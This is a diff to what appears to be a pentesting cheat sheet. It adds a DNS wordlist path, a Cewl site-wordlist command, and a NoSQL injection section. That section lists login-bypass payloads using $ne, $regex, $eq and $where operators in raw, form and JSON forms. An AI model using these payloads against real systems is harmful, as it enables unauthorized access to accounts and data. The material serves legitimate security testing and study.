@@ -28,6 +28,7 @@
 | Name                      | Path                                                                    |
 |:--------------------------|:------------------------------------------------------------------------|
 | SecLists Raft Medium      | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
+| SecList DNS               | `/usr/share/seclists/Discovery/DNS/namelist.txt`                        |
 | Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |
 | Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |
 | Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |
@@ -42,6 +43,13 @@
 | DB      | `db,sqlite`    |
 | Linux   | `sh,bin`       |
 | Windows | `ps1,exe`      |
+
+### Cewl
+> A tool to create a wordlist from a site.
+
+```bash
+cewl -d 5 -e --with-numbers http://example.com/
+```
 
 ### ffuf
 ```bash
@@ -76,6 +84,36 @@ dirbuster
 ```bash
 owasp-zap
 ```
+
+# Nosql Injection
+> NoSQL databases (aka "not only SQL") are non-tabular databases and store data differently than relational tables.
+> The syntax is different from traditional SQL syntax.
+> Example: Mongo
+
+### Common Pattern
+```
+' || 1==1 %00
+' || 1==1 //
+{ $ne: 1 }
+true, $where: '1 == 1'
+'; return 1 %00
+```
+
+### Form
+```
+username[$ne]=lol$password[$ne]=lol
+username[$regex]=.*$password[$regex]=.*
+username[$eq]=admin&password[$eq]=admin
+```
+
+### JSON
+```json
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$eq": "admin"}, "password": {"$ne": "admin"}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+```
+
+- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
 
 # SQL Injection
 > SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
